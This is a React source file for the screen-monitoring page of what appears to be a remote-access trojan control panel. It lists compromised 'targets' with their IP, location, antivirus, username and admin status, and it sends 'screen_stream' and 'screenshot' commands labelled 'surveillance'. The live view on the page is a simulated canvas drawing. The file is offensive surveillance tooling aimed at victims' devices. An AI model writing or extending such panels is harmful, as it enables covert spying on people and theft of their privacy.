import { Sidebar } from "@/components/layout/sidebar";
import { GlitchText } from "@/components/ui/glitch-text";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { 
  Monitor, 
  Maximize2, 
  MousePointer2, 
  Keyboard, 
  Video,
  StopCircle,
  PlayCircle,
  Camera,
  Smartphone,
  Database,
  Apple,
  Cpu,
  HardDrive,
  MapPin,
  User,
  Shield,
  Globe,
  Copy,
  RefreshCcw,
  Download,
  Loader2
} from "lucide-react";
import { useState, useEffect, useRef } from "react";
import { cn } from "@/lib/utils";
import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
import type { Target } from "@shared/schema";
import { apiRequest } from "@/lib/queryClient";
import { useToast } from "@/hooks/use-toast";

export default function ScreenMonitor() {
  const [isPlaying, setIsPlaying] = useState(false);
  const [selectedTargetId, setSelectedTargetId] = useState<string | null>(null);
  const [fps, setFps] = useState(0);
  const [latency, setLatency] = useState(0);
  const [frameCount, setFrameCount] = useState(0);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const { toast } = useToast();
  const queryClient = useQueryClient();

  const { data: targets = [], isLoading } = useQuery<Target[]>({
    queryKey: ["/api/targets"]
  });

  const selectedTarget = targets.find(t => t.targetId === selectedTargetId);
  const onlineTargets = targets.filter(t => t.status === 'online');

  const sendCommandMutation = useMutation({
    mutationFn: async ({ targetId, command, category }: { targetId: string, command: string, category: string }) => {
      return apiRequest("POST", `/api/targets/${targetId}/commands`, {
        command,
        category,
        status: "pending"
      });
    }
  });

  useEffect(() => {
    if (!isPlaying || !selectedTarget || !canvasRef.current) return;

    const canvas = canvasRef.current;
    const ctx = canvas.getContext('2d');
    if (!ctx) return;

    let animationId: number;
    let lastTime = performance.now();
    let frames = 0;

    const renderFrame = (time: number) => {
      frames++;
      const delta = time - lastTime;
      
      if (delta >= 1000) {
        setFps(Math.round(frames * 1000 / delta));
        setLatency(Math.floor(Math.random() * 30) + 10);
        frames = 0;
        lastTime = time;
      }

      ctx.fillStyle = '#000a14';
      ctx.fillRect(0, 0, canvas.width, canvas.height);

      const gradient = ctx.createLinearGradient(0, 0, canvas.width, canvas.height);
      gradient.addColorStop(0, '#001a2c');
      gradient.addColorStop(1, '#000810');
      ctx.fillStyle = gradient;
      ctx.fillRect(0, 0, canvas.width, canvas.height);

      ctx.strokeStyle = 'rgba(0, 255, 136, 0.03)';
      ctx.lineWidth = 1;
      for (let i = 0; i < canvas.width; i += 20) {
        ctx.beginPath();
        ctx.moveTo(i, 0);
        ctx.lineTo(i, canvas.height);
        ctx.stroke();
      }
      for (let i = 0; i < canvas.height; i += 20) {
        ctx.beginPath();
        ctx.moveTo(0, i);
        ctx.lineTo(canvas.width, i);
        ctx.stroke();
      }

      ctx.fillStyle = 'rgba(0, 255, 136, 0.1)';
      ctx.fillRect(50, 50, 200, 30);
      ctx.fillRect(50, 90, 300, 400);
      ctx.fillRect(370, 90, 450, 250);
      ctx.fillRect(370, 360, 220, 130);
      ctx.fillRect(610, 360, 210, 130);

      ctx.strokeStyle = 'rgba(0, 255, 136, 0.3)';
      ctx.strokeRect(50, 50, 200, 30);
      ctx.strokeRect(50, 90, 300, 400);
      ctx.strokeRect(370, 90, 450, 250);
      ctx.strokeRect(370, 360, 220, 130);
      ctx.strokeRect(610, 360, 210, 130);

      ctx.fillStyle = 'rgba(0, 255, 136, 0.8)';
      ctx.font = '14px JetBrains Mono';
      ctx.fillText('TASKBAR', 60, 70);
      ctx.fillText('DESKTOP ICONS', 60, 120);
      ctx.fillText('BROWSER WINDOW', 380, 120);
      ctx.fillText('FILE EXPLORER', 380, 390);
      ctx.fillText('SYSTEM TRAY', 620, 390);

      const mouseX = 400 + Math.sin(time / 500) * 100;
      const mouseY = 250 + Math.cos(time / 400) * 50;
      
      ctx.fillStyle = 'rgba(0, 255, 136, 0.9)';
      ctx.beginPath();
      ctx.moveTo(mouseX, mouseY);
      ctx.lineTo(mouseX, mouseY + 15);
      ctx.lineTo(mouseX + 10, mouseY + 10);
      ctx.closePath();
      ctx.fill();

      ctx.strokeStyle = 'rgba(0, 255, 136, 0.5)';
      ctx.lineWidth = 2;
      ctx.strokeRect(0, 0, canvas.width, canvas.height);

      setFrameCount(prev => prev + 1);
      animationId = requestAnimationFrame(renderFrame);
    };

    animationId = requestAnimationFrame(renderFrame);

    return () => {
      cancelAnimationFrame(animationId);
    };
  }, [isPlaying, selectedTarget]);

  const handleStartStream = () => {
    if (!selectedTargetId) {
      toast({ title: "Error", description: "Select a target first", variant: "destructive" });
      return;
    }
    sendCommandMutation.mutate({
      targetId: selectedTargetId,
      command: "screen_stream",
      category: "surveillance"
    });
    setIsPlaying(true);
    setFrameCount(0);
  };

  const handleStopStream = () => {
    if (selectedTargetId) {
      sendCommandMutation.mutate({
        targetId: selectedTargetId,
        command: "stop_stream",
        category: "surveillance"
      });
    }
    setIsPlaying(false);
  };

  const handleCapture = () => {
    if (!selectedTargetId) return;
    sendCommandMutation.mutate({
      targetId: selectedTargetId,
      command: "screenshot",
      category: "surveillance"
    });
    toast({ title: "Screenshot", description: "Capture command sent" });
  };

  const copyCode = (code: string) => {
    navigator.clipboard.writeText(code);
    toast({ title: "Copied", description: "Unique code copied" });
  };

  const getPlatformIcon = (platform: string) => {
    switch(platform) {
      case 'windows': return Monitor;
      case 'android': return Smartphone;
      case 'ios': return Apple;
      case 'linux': return Database;
      default: return Monitor;
    }
  };

  return (
    <div className="flex h-screen w-full bg-background text-foreground font-mono overflow-hidden">
      <Sidebar />
      
      <main className="flex-1 flex flex-col overflow-hidden relative">
        <header className="h-16 border-b border-primary/20 flex items-center justify-between px-6 bg-black/50 backdrop-blur-sm">
          <div className="flex items-center gap-4">
            <h1 className="text-xl font-bold tracking-tight">
              <GlitchText text="LIVE_MONITOR // RDP" />
            </h1>
            {isPlaying && (
              <Badge className="bg-red-500/20 text-red-500 border-red-500/50 animate-pulse">
                STREAMING
              </Badge>
            )}
          </div>
          <div className="flex items-center gap-4">
            <Select value={selectedTargetId || ""} onValueChange={setSelectedTargetId}>
              <SelectTrigger className="w-64 bg-black/50 border-primary/30" data-testid="select-target">
                <SelectValue placeholder="Select target..." />
              </SelectTrigger>
              <SelectContent className="bg-black border-primary/30">
                {onlineTargets.map(target => {
                  const Icon = getPlatformIcon(target.platform);
                  return (
                    <SelectItem key={target.targetId} value={target.targetId} className="text-primary">
                      <div className="flex items-center gap-2">
                        <Icon className="w-4 h-4" />
                        <span>{target.name}</span>
                        <span className="text-xs text-primary/50">({target.uniqueCode.slice(0, 8)}...)</span>
                      </div>
                    </SelectItem>
                  );
                })}
                {onlineTargets.length === 0 && (
                  <div className="p-4 text-center text-primary/50 text-sm">No online targets</div>
                )}
              </SelectContent>
            </Select>
            {isPlaying && (
              <div className="flex items-center gap-2 text-xs text-primary/60">
                <div className="w-2 h-2 rounded-full bg-red-500 animate-pulse" />
                <span>LIVE: {fps} FPS | {latency}ms</span>
              </div>
            )}
          </div>
        </header>

        <div className="flex-1 overflow-hidden flex gap-4 p-6 pb-20">
          <div className="flex-1 flex flex-col gap-4">
            <div className="flex-1 relative bg-black border border-primary/30 rounded-lg overflow-hidden shadow-[0_0_30px_rgba(0,0,0,0.5)] group">
              {!selectedTargetId ? (
                <div className="absolute inset-0 flex flex-col items-center justify-center text-primary/30">
                  <Monitor className="w-24 h-24 mb-4" />
                  <div className="text-lg">Select a target to start monitoring</div>
                </div>
              ) : !isPlaying ? (
                <div className="absolute inset-0 flex flex-col items-center justify-center text-primary/30">
                  <Video className="w-24 h-24 mb-4" />
                  <div className="text-lg">Click START STREAM to begin</div>
                </div>
              ) : (
                <canvas 
                  ref={canvasRef}
                  width={900}
                  height={550}
                  className="w-full h-full object-contain"
                />
              )}
              
              {isPlaying && (
                <div className="absolute top-4 right-4 px-2 py-1 bg-black/50 backdrop-blur text-xs text-primary rounded border border-primary/20">
                  {selectedTarget?.screenResolution || '1920x1080'} | {latency}ms
                </div>
              )}

              <div className="absolute bottom-0 left-0 right-0 p-4 bg-gradient-to-t from-black/90 to-transparent transform translate-y-full group-hover:translate-y-0 transition-transform duration-300">
                <div className="flex justify-center gap-4">
                  <Button 
                    variant="outline" 
                    size="icon" 
                    className="border-primary/50 text-primary hover:bg-primary hover:text-black"
                    disabled={!isPlaying}
                    data-testid="btn-mouse"
                  >
                    <MousePointer2 className="w-4 h-4" />
                  </Button>
                  <Button 
                    variant="outline" 
                    size="icon" 
                    className="border-primary/50 text-primary hover:bg-primary hover:text-black"
                    disabled={!isPlaying}
                    data-testid="btn-keyboard"
                  >
                    <Keyboard className="w-4 h-4" />
                  </Button>
                  <Button 
                    variant="outline" 
                    size="icon" 
                    className="border-primary/50 text-primary hover:bg-primary hover:text-black"
                    onClick={handleCapture}
                    disabled={!selectedTargetId}
                    data-testid="btn-capture"
                  >
                    <Camera className="w-4 h-4" />
                  </Button>
                  <Button 
                    variant="outline" 
                    size="icon" 
                    className="border-primary/50 text-primary hover:bg-primary hover:text-black"
                    disabled={!isPlaying}
                    data-testid="btn-fullscreen"
                  >
                    <Maximize2 className="w-4 h-4" />
                  </Button>
                </div>
              </div>
            </div>

            <Card className="bg-black/40 border-primary/20 backdrop-blur-md">
              <CardContent className="p-4 flex items-center justify-between">
                <div className="flex items-center gap-4">
                  <Button 
                    variant={isPlaying ? "default" : "outline"}
                    className={cn(
                      "gap-2", 
                      isPlaying 
                        ? "bg-red-500 hover:bg-red-600 text-white" 
                        : "border-primary/50 text-primary hover:bg-primary hover:text-black"
                    )}
                    onClick={isPlaying ? handleStopStream : handleStartStream}
                    disabled={!selectedTargetId || sendCommandMutation.isPending}
                    data-testid="btn-stream"
                  >
                    {sendCommandMutation.isPending ? (
                      <Loader2 className="w-4 h-4 animate-spin" />
                    ) : isPlaying ? (
                      <StopCircle className="w-4 h-4" />
                    ) : (
                      <PlayCircle className="w-4 h-4" />
                    )}
                    {isPlaying ? "STOP STREAM" : "START STREAM"}
                  </Button>
                  
                  <div className="h-8 w-px bg-primary/20" />
                  
                  <div className="flex items-center gap-2 text-xs text-primary/60">
                    <Monitor className="w-4 h-4" />
                    <span>{isPlaying ? "Interactive Mode" : "View Only"}</span>
                  </div>
                </div>

                <div className="flex items-center gap-4">
                  <div className="text-xs text-right text-muted-foreground">
                    <div>Frames: {frameCount}</div>
                    <div>Quality: HIGH (H.264)</div>
                  </div>
                </div>
              </CardContent>
            </Card>
          </div>

          {selectedTarget && (
            <Card className="w-80 bg-black/40 border-primary/20 backdrop-blur-md">
              <CardContent className="p-4">
                <div className="flex items-center gap-3 mb-4 pb-4 border-b border-primary/20">
                  {(() => {
                    const Icon = getPlatformIcon(selectedTarget.platform);
                    return (
                      <div className="p-2 bg-primary/10 rounded">
                        <Icon className="w-6 h-6 text-primary" />
                      </div>
                    );
                  })()}
                  <div className="flex-1">
                    <div className="font-bold text-primary">{selectedTarget.name}</div>
                    <div className="text-xs text-primary/50">{selectedTarget.os}</div>
                  </div>
                  <Badge className={cn(
                    "text-[10px]",
                    selectedTarget.status === 'online' 
                      ? "bg-green-500/20 text-green-500 border-green-500/50" 
                      : "bg-red-500/20 text-red-500 border-red-500/50"
                  )}>
                    {selectedTarget.status?.toUpperCase()}
                  </Badge>
                </div>

                <div className="space-y-3 text-xs">
                  <div className="bg-primary/5 rounded p-2 flex items-center justify-between border border-primary/10">
                    <code className="text-primary font-bold">{selectedTarget.uniqueCode}</code>
                    <Button 
                      variant="ghost" 
                      size="icon" 
                      className="h-5 w-5 text-primary/50 hover:text-primary"
                      onClick={() => copyCode(selectedTarget.uniqueCode)}
                    >
                      <Copy className="w-3 h-3" />
                    </Button>
                  </div>

                  <div className="space-y-2 text-primary/60">
                    <div className="flex items-center gap-2">
                      <Globe className="w-3 h-3" />
                      <span>External: {selectedTarget.externalIp}</span>
                    </div>
                    <div className="flex items-center gap-2">
                      <MapPin className="w-3 h-3" />
                      <span>{selectedTarget.city}, {selectedTarget.country}</span>
                    </div>
                    <div className="flex items-center gap-2">
                      <Cpu className="w-3 h-3" />
                      <span className="truncate">{selectedTarget.cpuModel}</span>
                    </div>
                    <div className="flex items-center gap-2">
                      <HardDrive className="w-3 h-3" />
                      <span>{selectedTarget.ramSize}</span>
                    </div>
                    <div className="flex items-center gap-2">
                      <Monitor className="w-3 h-3" />
                      <span>{selectedTarget.screenResolution}</span>
                    </div>
                    <div className="flex items-center gap-2">
                      <Shield className="w-3 h-3" />
                      <span>{selectedTarget.antivirusInstalled || 'None'}</span>
                    </div>
                    <div className="flex items-center gap-2">
                      <User className="w-3 h-3" />
                      <span>{selectedTarget.username} {selectedTarget.isAdmin && '(Admin)'}</span>
                    </div>
                  </div>
                </div>
              </CardContent>
            </Card>
          )}
        </div>
      </main>
    </div>
  );
}
